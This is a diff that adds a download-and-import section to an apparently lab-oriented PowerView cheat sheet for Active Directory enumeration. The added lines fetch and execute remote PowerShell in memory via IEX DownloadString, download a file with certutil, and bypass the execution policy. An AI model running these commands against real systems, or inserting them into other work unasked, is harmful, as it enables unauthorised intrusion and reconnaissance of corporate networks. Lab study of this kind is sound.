@@ -264,6 +264,17 @@ Get-ADDomainController -Filter * -Server za.tryhackme.com
 
 # 🧠 PowerView Cheat Sheet (Active Directory Enumeration)
 
+## Download and Import
+
+```
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP>/PowerView.ps1')"
+or
+certutil -urlcache -split -f http://10.10.10.10/PowerView.ps1 PowerView.ps1
+powershell -ep bypass
+Import-Module .\PowerView.ps1
+Get-DomainUser
+```
+
 ## ⚙️ Load PowerView
 
 ```powershell
